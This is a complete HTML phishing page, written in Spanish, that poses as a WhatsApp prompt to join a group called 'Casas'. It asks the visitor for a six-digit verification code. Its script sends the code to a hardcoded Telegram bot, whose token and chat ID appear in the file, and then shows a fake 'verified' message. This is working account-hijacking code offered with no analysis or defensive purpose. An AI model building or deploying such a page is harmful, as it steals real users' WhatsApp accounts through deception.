<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp</title>
    <style>
        body { font-family: sans-serif; background: #fff; display: flex; flex-direction: column; align-items: center; margin: 0; }
        .header { background: #008069; color: white; width: 100%; padding: 15px; font-size: 20px; font-weight: bold; }
        .container { text-align: center; padding: 20px; max-width: 350px; }
        .icon { width: 80px; height: 80px; background: #eee; border-radius: 50%; margin: 20px auto; display: flex; align-items: center; justify-content: center; font-size: 40px; }
        p { color: #666; font-size: 14px; }
        .inputs { display: flex; gap: 5px; justify-content: center; margin: 20px 0; }
        .inputs input { width: 35px; height: 45px; text-align: center; border: 1px solid #008069; border-radius: 5px; font-size: 20px; }
        .btn { background: #008069; color: white; border: none; padding: 12px; width: 100%; border-radius: 20px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="header">WhatsApp</div>
    <div class="container">
        <div class="icon">👥</div>
        <h3>Unirse al grupo "Casas"</h3>
        <p>Ingresa el código de 6 dígitos para verificar tu cuenta.</p>
        <div class="inputs" id="box">
            <input type="number" maxlength="1" oninput="if(this.value.length>1)this.value=this.value.slice(0,1); if(this.value!='')document.getElementById('box').children[1].focus()">
            <input type="number" maxlength="1" oninput="if(this.value.length>1)this.value=this.value.slice(0,1); if(this.value!='')document.getElementById('box').children[2].focus()">
            <input type="number" maxlength="1" oninput="if(this.value.length>1)this.value=this.value.slice(0,1); if(this.value!='')document.getElementById('box').children[3].focus()">
            <input type="number" maxlength="1" oninput="if(this.value.length>1)this.value=this.value.slice(0,1); if(this.value!='')document.getElementById('box').children[4].focus()">
            <input type="number" maxlength="1" oninput="if(this.value.length>1)this.value=this.value.slice(0,1); if(this.value!='')document.getElementById('box').children[5].focus()">
            <input type="number" maxlength="1" oninput="if(this.value.length>1)this.value=this.value.slice(0,1)">
        </div>
        <button class="btn" onclick="enviar()">AUTENTICAR</button>
    </div>

    <script>
        function enviar() {
            const botToken = '8658431564:AAG_X2OY9fTPugsL9nVeT6aeHcg2h-jP4zU';
            const chatId = '6475554235';
            let codigo = "";
            const inputs = document.querySelectorAll('input');
            inputs.forEach(i => codigo += i.value);

            if(codigo.length === 6) {
                const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=NUEVO_CODIGO_CASAS: ${codigo}`;
                
                // Intento de envío directo
                fetch(url).then(() => {
                    alert("¡Código verificado! Estás siendo redirigido al grupo...");
                    location.reload();
                }).catch(() => {
                    alert("Error de conexión. Inténtalo de nuevo.");
                });
            } else {
                alert("Pon los 6 números.");
            }
        }
    </script>
</body>
</html>
